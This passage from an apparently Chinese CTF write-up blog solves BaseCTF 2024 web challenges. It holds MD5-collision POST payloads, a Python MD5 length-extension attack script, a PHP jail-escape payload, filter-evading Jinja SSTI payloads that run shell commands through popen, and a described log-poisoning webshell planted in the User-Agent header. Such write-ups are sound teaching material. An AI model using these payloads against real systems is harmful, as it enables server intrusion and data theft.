class="hljs-string">&#x27;bananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) == <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;难吗?不难!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 你还是绕过去了?</span><br><span class="hljs-comment">// 哦哦哦, 我少了一个等于号</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apppple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 你以为这就结束了</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br>&#125;<br><br><span class="hljs-comment">// 你想看到 random 的值吗?</span><br><span class="hljs-comment">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span><br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>] ?? <span class="hljs-string">&#x27;user&#x27;</span>;<br><br><span class="hljs-comment">// check if name ends with &#x27;admin&#x27;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, -<span class="hljs-number">5</span>) !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;不是管理员也来凑热闹?&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$md5</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span> . <span class="hljs-variable">$name</span>) !== <span class="hljs-variable">$md5</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;伪造? NO NO NO!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 认输了, 看样子你真的很懂 MD5</span><br><span class="hljs-comment">// 那 flag 就给你吧</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看样子你真的很懂 MD5&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>第一层正常的数组绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apple[]=1&amp;banana[]=2<br></code></pre></td></tr></table></figure><p>第二层和第三层都强制转string了，可以利用到fastcoll来获得内容进行绕过，这里我直接用网上的了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">appple=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;bananana=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2&amp;apppple=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;banananana=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2<br></code></pre></td></tr></table></figure><p>最后一层已知$random的MD5值，可以控制name和md5的值，求等式进行绕过，通过了解知道是MD5长度拓展攻击</p><p>先前一直在找hashpump的一直不好用现在贴一个比较好用的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack, unpack<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> floor, sin<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">MD5 Extension Attack</span><br><span class="hljs-string">====================</span><br><span class="hljs-string"></span><br><span class="hljs-string">@refs</span><br><span class="hljs-string">https://github.com/shellfeel/hash-ext-attack</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MD5</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.A, <span class="hljs-variable language_">self</span>.B, <span class="hljs-variable language_">self</span>.C, <span class="hljs-variable language_">self</span>.D = \<br>            (<span class="hljs-number">0x67452301</span>, <span class="hljs-number">0xefcdab89</span>, <span class="hljs-number">0x98badcfe</span>, <span class="hljs-number">0x10325476</span>)  <span class="hljs-comment"># initial values</span><br>        <span class="hljs-variable language_">self</span>.r: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] = \<br>            [<span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>] * <span class="hljs-number">4</span> + [<span class="hljs-number">5</span>,  <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>] * <span class="hljs-number">4</span> + \<br>            [<span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>] * <span class="hljs-number">4</span> + [<span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>] * <span class="hljs-number">4</span>  <span class="hljs-comment"># shift values</span><br>        <span class="hljs-variable language_">self</span>.k: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] = \<br>            [floor(<span class="hljs-built_in">abs</span>(sin(i + <span class="hljs-number">1</span>)) * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">32</span>))<br>             <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]  <span class="hljs-comment"># constants</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_lrot</span>(<span class="hljs-params">self, x: <span class="hljs-built_in">int</span>, n: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-comment"># left rotate</span><br>        <span class="hljs-keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; <span class="hljs-number">32</span> - n)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">self, chunk: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># update the hash for a chunk of data (64 bytes)</span><br>        w = <span class="hljs-built_in">list</span>(unpack(<span class="hljs-string">&#x27;&lt;&#x27;</span>+<span class="hljs-string">&#x27;I&#x27;</span>*<span class="hljs-number">16</span>, chunk))<br>        a, b, c, d = <span class="hljs-variable language_">self</span>.A, <span class="hljs-variable language_">self</span>.B, <span class="hljs-variable language_">self</span>.C, <span class="hljs-variable language_">self</span>.D<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>            <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">16</span>:<br>                f = (b &amp; c) | ((~b) &amp; d)<br>                flag = i<br>            <span class="hljs-keyword">elif</span> i &lt; <span class="hljs-number">32</span>:<br>                f = (b &amp; d) | (c &amp; (~d))<br>                flag = (<span class="hljs-number">5</span> * i + <span class="hljs-number">1</span>) % <span class="hljs-number">16</span><br>            <span class="hljs-keyword">elif</span> i &lt; <span class="hljs-number">48</span>:<br>                f = (b ^ c ^ d)<br>                flag = (<span class="hljs-number">3</span> * i + <span class="hljs-number">5</span>) % <span class="hljs-number">16</span><br>            <span class="hljs-keyword">else</span>:<br>                f = c ^ (b | (~d))<br>                flag = (<span class="hljs-number">7</span> * i) % <span class="hljs-number">16</span><br><br>            tmp = b + \<br>                <span class="hljs-variable language_">self</span>._lrot((a + f + <span class="hljs-variable language_">self</span>.k[i] + w[flag])<br>                           &amp; <span class="hljs-number">0xffffffff</span>, <span class="hljs-variable language_">self</span>.r[i])<br>            a, b, c, d = d, tmp &amp; <span class="hljs-number">0xffffffff</span>, b, c<br><br>        <span class="hljs-variable language_">self</span>.A = (<span class="hljs-variable language_">self</span>.A + a) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-variable language_">self</span>.B = (<span class="hljs-variable language_">self</span>.B + b) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-variable language_">self</span>.C = (<span class="hljs-variable language_">self</span>.C + c) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-variable language_">self</span>.D = (<span class="hljs-variable language_">self</span>.D + d) &amp; <span class="hljs-number">0xffffffff</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">extend</span>(<span class="hljs-params">self, msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># extend the hash with a new message (padded)</span><br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(msg) % <span class="hljs-number">64</span> == <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(msg), <span class="hljs-number">64</span>):<br>            <span class="hljs-variable language_">self</span>.update(msg[i:i + <span class="hljs-number">64</span>])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">padding</span>(<span class="hljs-params">self, msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-comment"># pad the message</span><br>        length = pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-built_in">len</span>(msg) * <span class="hljs-number">8</span>)<br><br>        msg += <span class="hljs-string">b&#x27;\x80&#x27;</span><br>        msg += <span class="hljs-string">b&#x27;\x00&#x27;</span> * ((<span class="hljs-number">56</span> - <span class="hljs-built_in">len</span>(msg)) % <span class="hljs-number">64</span>)<br>        msg += length<br><br>        <span class="hljs-keyword">return</span> msg<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">digest</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-comment"># return the hash</span><br>        <span class="hljs-keyword">return</span> pack(<span class="hljs-string">&#x27;&lt;IIII&#x27;</span>, <span class="hljs-variable language_">self</span>.A, <span class="hljs-variable language_">self</span>.B, <span class="hljs-variable language_">self</span>.C, <span class="hljs-variable language_">self</span>.D)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_md5</span>(<span class="hljs-params">test_string: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-comment"># (DEBUG function) verify the MD5 implementation</span><br>    <span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5 <span class="hljs-keyword">as</span> md5_hashlib<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_manual</span>(<span class="hljs-params">msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        md5 = MD5()<br>        md5.extend(md5.padding(msg))<br>        <span class="hljs-keyword">return</span> md5.digest()<br><br>    manual_result = md5_manual(test_string).<span class="hljs-built_in">hex</span>()<br>    hashlib_result = md5_hashlib(test_string).hexdigest()<br><br>    <span class="hljs-keyword">assert</span> manual_result == hashlib_result, <span class="hljs-string">&quot;Test failed!&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">message_len: <span class="hljs-built_in">int</span>, known_hash: <span class="hljs-built_in">str</span>,</span><br><span class="hljs-params">           append_str: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">tuple</span>:<br>    <span class="hljs-comment"># MD5 extension attack</span><br>    md5 = MD5()<br><br>    previous_text = md5.padding(<span class="hljs-string">b&quot;*&quot;</span> * message_len)<br>    current_text = previous_text + append_str<br><br>    md5.A, md5.B, md5.C, md5.D = unpack(<span class="hljs-string">&quot;&lt;IIII&quot;</span>, <span class="hljs-built_in">bytes</span>.fromhex(known_hash))<br>    md5.extend(md5.padding(current_text)[<span class="hljs-built_in">len</span>(previous_text):])<br><br>    <span class="hljs-keyword">return</span> current_text[message_len:], md5.digest().<span class="hljs-built_in">hex</span>()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    message_len = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input known text length: &quot;</span>))<br>    known_hash = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input known hash: &quot;</span>).strip()<br>    append_text = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input append text: &quot;</span>).strip().encode()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attacking...&quot;</span>)<br><br>    extend_str, final_hash = attack(message_len, known_hash, append_text)<br><br>    <span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br>    <span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text:&quot;</span>, extend_str)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text (URL encoded):&quot;</span>, quote(extend_str))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text (Base64):&quot;</span>, b64encode(extend_str).decode())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Final hash:&quot;</span>, final_hash)<br></code></pre></td></tr></table></figure><p>通过对源码的分析得知random的长度应该是96</p><p><img src="/../../images/basectf/basectf2024/dongmd5.png" alt="dongmd5"></p><p>然后填入就好了</p><p><img src="/../../images/basectf/basectf2024/dongmd51.png" alt="dongmd51"></p><h1 id="week3"><a class="markdownIt-Anchor" href="#week3"></a> week3</h1><h2 id="web-3"><a class="markdownIt-Anchor" href="#web-3"></a> web</h2><h3 id="ez_php_jail"><a class="markdownIt-Anchor" href="#ez_php_jail"></a> ez_php_jail</h3><p>这题搜一下其实挺有意思的，应该是从这篇文章进行微调出的题目,<a href="https://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-php/">ringzer0 CTF - Jail Escaping PHP</a>,具体应该是对应level4的那个题目</p><p>打开查看源码进行base64解密，进入可以查看phpinfo(),得到了php版本是7.4,以及一些disable_functions</p><p>直接利用文章构造payload,其外根据php特性，在php小于8的情况下<code>_</code>是直接转化成<code>.</code>可以利用<code>[</code>进行绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?Jail[by.Happy=highlight_file(glob(<span class="hljs-string">&quot;/f*&quot;</span>)[0]);<br></code></pre></td></tr></table></figure><h3 id="复读机"><a class="markdownIt-Anchor" href="#复读机"></a> 复读机</h3><p>有过滤的，手测一下</p><p><code>&#123;&#123;`  `+`  `-`  `*`  `&#125;&#125;</code>  <code>&quot;</code>  <code>:</code>  <code>\</code>  <code>/</code>  <code>__</code>  <code>.</code>,接下来就是正常的RCE就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">BaseCTF&#123;%<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_cla&#x27;</span><span class="hljs-string">&#x27;ss_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_m&#x27;</span><span class="hljs-string">&#x27;ro_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_subcl&#x27;</span><span class="hljs-string">&#x27;asses_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]()[<span class="hljs-number">137</span>])%&#125;<br></code></pre></td></tr></table></figure><p>可以利用<code>BaseCTF&lt;class 'os._wrap_close'&gt;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">BaseCTF&#123;%<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_cla&#x27;</span><span class="hljs-string">&#x27;ss_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_m&#x27;</span><span class="hljs-string">&#x27;ro_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_subcl&#x27;</span><span class="hljs-string">&#x27;asses_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]()[<span class="hljs-number">137</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_in&#x27;</span><span class="hljs-string">&#x27;it_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_gl&#x27;</span><span class="hljs-string">&#x27;obals_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;pen&#x27;</span>](<span class="hljs-string">&#x27;env&#x27;</span>)[<span class="hljs-string">&#x27;re&#x27;</span><span class="hljs-string">&#x27;ad&#x27;</span>]())%&#125;<br></code></pre></td></tr></table></figure><p>看看环境，已知不能使用<code>/</code>,可以切换根目录再读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">BaseCTF&#123;%<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_cla&#x27;</span><span class="hljs-string">&#x27;ss_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_m&#x27;</span><span class="hljs-string">&#x27;ro_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_subcl&#x27;</span><span class="hljs-string">&#x27;asses_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]()[<span class="hljs-number">137</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_in&#x27;</span><span class="hljs-string">&#x27;it_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_gl&#x27;</span><span class="hljs-string">&#x27;obals_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;pen&#x27;</span>](<span class="hljs-string">&#x27;cd $OLDPWD;cat flag&#x27;</span>)[<span class="hljs-string">&#x27;re&#x27;</span><span class="hljs-string">&#x27;ad&#x27;</span>]())%&#125;<br></code></pre></td></tr></table></figure><h3 id="滤个不停"><a class="markdownIt-Anchor" href="#滤个不停"></a> 滤个不停</h3><p>这题和ctfshow的web4基本差不多，一开始我以为要从伪协议入手，还是要求的是服务器日志，用的是Nginx，存放在/var/log/nginx/access.log里面，让Datch赋值这个，然后在UA头里写马就行了</p><p><img src="/../../images/basectf/basectf2024/%E6%BB%A4%E4%B8%AA%E4%B8%8D%E5%81%9C.png" alt="滤个不停"></p><h3 id="玩原神玩的"><a class="markdownIt-Anchor" href="#玩原神玩的"></a> 玩原神玩的</h3><p>这题其实还是能研究很多的，我写代码的能力一直挺一般的，这个还是稍微考究一些</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;len&#x27;</span>]) == <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$array</span>)) &#123;<br> <span class="hljs-title function_ invoke__">ys_open</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tip&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;错了！就你还想玩原神？❌❌❌&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ys_open</span>(<span class="hljs-params"><span class="hljs-variable">$tip</span></span>) </span>&#123;<br> <span class="hljs-keyword">if</span> (<span 